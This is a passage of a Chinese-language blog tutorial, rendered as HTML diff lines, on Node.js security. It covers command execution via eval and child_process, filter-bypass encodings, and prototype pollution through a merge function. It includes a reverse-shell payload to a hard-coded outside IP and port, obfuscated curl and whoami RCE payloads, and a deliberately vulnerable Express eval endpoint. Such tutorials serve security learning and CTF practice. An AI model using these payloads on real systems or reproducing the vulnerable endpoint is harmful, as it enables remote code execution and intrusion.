+  <span class="token literal-property property">uid</span><span class="token operator">:</span> options<span class="token punctuation">.</span>uid<span class="token punctuation">,</span>
+  <span class="token literal-property property">shell</span><span class="token operator">:</span> options<span class="token punctuation">.</span>shell<span class="token punctuation">,</span>
+  <span class="token literal-property property">windowsHide</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>options<span class="token punctuation">.</span>windowsHide<span class="token punctuation">,</span>
+  <span class="token literal-property property">windowsVerbatimArguments</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>options<span class="token punctuation">.</span>windowsVerbatimArguments
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="exec-amp-execSync"><a href="#exec-amp-execSync" class="headerlink" title="exec() &amp; execSync()"></a>exec() &amp; execSync()</h3><p>本地测试上面 eval 的那个demo</p>
+<p>Node.js中的<code>chile_process.exec</code>调用的是 <code>bash.sh</code> ，它是一个bash解释器，可以执行系统命令。</p>
+<p>在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p>
+<p>尝试弹计算器</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">/</span>eval<span class="token operator">?</span>a<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230629165142909.png" alt="image-20230629165142909"></p>
+<p>反弹shell：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/115.236.153.170/14723 &lt;&amp;1'"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="execFile"><a href="#execFile" class="headerlink" title="execFile()"></a>execFile()</h3><blockquote>
+<p>启动一个子进程来执行可执行文件</p>
+</blockquote>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execFile</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">shell</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以执行文件，也可以像这样调用指令，执行文件指的是执行exe这样的，而不是执行js文件</p>
+<h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h3><blockquote>
+<p>用于执行 js 文件</p>
+</blockquote>
+<p>实际利用中需要提前写入恶意文件</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">"./hacker.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="spawn-amp-spawnSync"><a href="#spawn-amp-spawnSync" class="headerlink" title="spawn() &amp; spawnSync()"></a>spawn() &amp; spawnSync()</h3><blockquote>
+<p>启动一个子进程来执行命令</p>
+</blockquote>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">shell</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>注：上述的<code>exec</code>、<code>spawn</code>、<code>fork</code>等等都是分为同步和异步的，所谓异步也就是不堵塞程序的执行，因此也不可能会有回显，因此一般我们用的都是同步的命令执行来获取回显，如<code>execSync</code>，<code>spawnSync</code>等等</p>
+<hr>
+<h2 id="过滤require"><a href="#过滤require" class="headerlink" title="过滤require"></a>过滤require</h2><p>现在我们添加一点过滤，把require过滤掉</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/eval'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'require'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 检测关键字</span>
+        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">var</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:8888/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230629170501622.png" alt="image-20230629170501622"></p>
+<p>很明显上面的payload打不通了</p>
+<p>这个时候可以使用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code>来执行命令，这里其实和flask ssti的payload有类似之处</p>
+<ul>
+<li><code>global</code> 对象是 Node.js 环境下的全局对象，它包含了 Node.js 中的一些全局变量和函数。</li>
+<li><code>process</code> 对象是 <code>global</code> 对象的一个属性，它包含了当前 Node.js 进程的相关信息和控制方法。</li>
+<li><code>mainModule</code> 属性是 <code>process</code> 对象的一个属性，它指向当前 Node.js 应用程序的入口模块。</li>
+<li><code>constructor</code> 属性是 <code>mainModule</code> 对象的一个属性，它指向当前模块的构造函数。</li>
+<li><code>_load()</code> 方法是 <code>constructor</code> 对象的一个方法，它可以加载指定的模块并返回该模块的导出对象。</li>
+</ul>
+<p>即<code>global.process.mainModule.constructor._load</code>&#x3D;&#x3D;<code>require</code></p>
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230629170753689.png" alt="image-20230629170753689"></p>
+<p>注：node 是基于 chrome v8 内核的，运行时，压根就不会有 <code>require</code> 这种关键字，模块加载不进来，所以有时候会报<code>require is not defined</code> 。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 <code>require</code> 进行编译</p>
+<h2 id="setIntval"><a href="#setIntval" class="headerlink" title="setIntval()"></a>setIntval()</h2><p>间隔两秒执行函数：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setInterval</span><span class="token punctuation">(</span>some_function<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout()"></a>setTimeout()</h2><p>两秒后执行函数：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span>some_function<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>some_function处就类似于eval函数的参数</p>
+<p>弹计算器：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="整型溢出"><a href="#整型溢出" class="headerlink" title="整型溢出"></a>整型溢出</h3><p>当设置的延迟时间不在<code>1~2^31-1</code>这个int范围内时，就会溢出为1，相当于0延迟</p>
+<h2 id="Function"><a href="#Function" class="headerlink" title="Function()"></a>Function()</h2><p>输出HelloWorld：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">"console.log('HelloWolrd')"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>类似于php中的create_function</p>
+<hr>
+<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">===</span><span class="token string">"\x61"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>正则匹配的时候，16进制不会转化成字符，于是有</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"exe\x63Sync"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"curl 127.0.0.1:1234"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"\u0061"</span><span class="token operator">===</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// true</span>
+<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"exe\u0063Sync"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"curl 127.0.0.1:1234"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="加号拼接"><a href="#加号拼接" class="headerlink" title="加号拼接"></a>加号拼接</h3><p>加号在js中可以用来连接字符</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token operator">%</span>2b<span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'curl 127.0.0.1:1234'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h3><p>上面讲特性的时候已经提到过了</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">exe</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">cSync</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'curl 127.0.0.1:1234'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="concat连接"><a href="#concat连接" class="headerlink" title="concat连接"></a>concat连接</h3><p>利用js中的concat函数连接字符串</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"exe"</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">"cSync"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"curl 127.0.0.1:1234"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik='</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接下来考虑一些js的语法和内置函数来bypass</p>
+<h3 id="Obejct-keys"><a href="#Obejct-keys" class="headerlink" title="Obejct.keys"></a>Obejct.keys</h3><p>实际上通过<code>require</code>导入的模块是一个<code>Object</code>，所以就可以用<code>Object</code>中的方法来操作获取内容。利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，再通过数组下标就可以拿到<code>execSync</code></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token operator">===</span>Object<span class="token punctuation">)</span>
+<span class="token comment">// true</span>
+Object<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'curl 127.0.0.1:1234'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20240324010650804.png" alt="image-20240324010650804"></p>
+<h3 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h3><p>使用<code>Reflect</code>这个关键字来实现<strong>反射调用函数</strong></p>
+<p>可以通过<code>Reflect.ownKeys(global)</code>拿到所有函数，然后<code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))]</code>即可得到eval</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">//返回所有函数</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>global<span class="token punctuation">[</span>Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token operator">=></span>x<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token comment">//拿到eval</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>拿到eval，接下来就能rce了</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">global<span class="token punctuation">[</span>Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token operator">=></span>x<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'global.process.mainModule.constructor._load("child_process").execSync("whoami")'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这里还有个小trick：如果过滤了<code>eval</code>关键字，可以用<code>includes(&#39;eva&#39;)</code>来搜索<code>eval</code>函数，也可以用<code>startsWith(&#39;eva&#39;)</code>来搜索</p>
+<h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>获取到eval的方式是通过<code>global</code>数组，其中用到了中括号<code>[]</code>，假如中括号被过滤，可以用<code>Reflect.get</code>来绕</p>
+<p><code>Reflect.get(target, propertyKey[, receiver])</code>的作用是获取对象身上某个属性的值，类似于<code>target[name]</code></p>
+<p>所以取 eval 的函数方式变成</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Reflect<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>global<span class="token punctuation">,</span> Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token operator">=></span>x<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'eva'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>后面拼接上命令执行的payload即可</p>
+<hr>
+<h1 id="基础原型链污染"><a href="#基础原型链污染" class="headerlink" title="基础原型链污染"></a>基础原型链污染</h1><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">关于原型链的详细文章</a></p>
+<p>在javascript，每一个实例对象都有一个<code>prototype</code>属性，<code>prototype</code> 属性可以向对象添加属性和方法</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name<span class="token operator">=</span>value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)</p>
+<p>可以通过以下方式访问得到某一实例对象的原型对象：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">objectname<span class="token punctuation">[</span><span class="token string">"__proto__"</span><span class="token punctuation">]</span>
+objectname<span class="token punctuation">.</span>__proto__
+objectname<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>示例：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token comment">// o对象直接继承了Object.prototype</span>
+<span class="token comment">// 原型链：</span>
+<span class="token comment">// o ---> Object.prototype ---> null</span>
+
+<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"yo"</span><span class="token punctuation">,</span> <span class="token string">"whadup"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token comment">// 数组都继承于 Array.prototype</span>
+<span class="token comment">// 原型链：</span>
+<span class="token comment">// a ---> Array.prototype ---> Object.prototype ---> null</span>
+
+<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 函数都继承于 Function.prototype</span>
+<span class="token comment">// 原型链：</span>
+<span class="token comment">// f ---> Function.prototype ---> Object.prototype ---> null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230630120238373.png" alt="image-20230630120238373"></p>
+<hr>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">p神的文章</a></p>
+<p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，</p>
+<p>我们就可以给object对象的原型设置一个b属性，值为value。</p>
+<p>这样所有<strong>继承object对象原型</strong>的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p>
+<p>例子：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">object1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"a"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string-property property">"b"</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+object1<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token string">"Hello World"</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object1<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
+object2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"c"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string-property property">"d"</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object2<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230630120634433.png" alt="image-20230630120634433"></p>
+<p>我们可以发现<code>object2</code>在没有设置foo属性的情况下，也输出了Hello World</p>
+<p>因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了<code>Object.prototype</code>。</p>
+<p>在获取object2.foo时，由于object2本身不存在foo属性，就会往父类<code>Object.prototype</code>中去寻找</p>
+<p>这就造成了一个原型链污染，所以原型链污染的本质应该是利用<strong>子类继承父类的特性</strong>实现的，只要我们能控制一个子类并修改其对象的原型，就能影响到所有和这个对象同一个原型的对象</p>
+<hr>
+<h2 id="merge操作"><a href="#merge操作" class="headerlink" title="merge操作"></a>merge操作</h2><blockquote>
+<p>表示合并两个或多个对象或数组的操作，将它们的属性或元素合并到一个新的对象或数组中</p>
+</blockquote>
+<p>例：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">let</span> object1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token keyword">let</span> object2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span><span class="token punctuation">)</span>
+<span class="token function">merge</span><span class="token punctuation">(</span>object1<span class="token punctuation">,</span> object2<span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> object1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>
+
+object3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object3<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注：在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</p>
+<p>最终输出的结果为</p>
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230630122542932.png" alt="image-20230630122542932"></p>
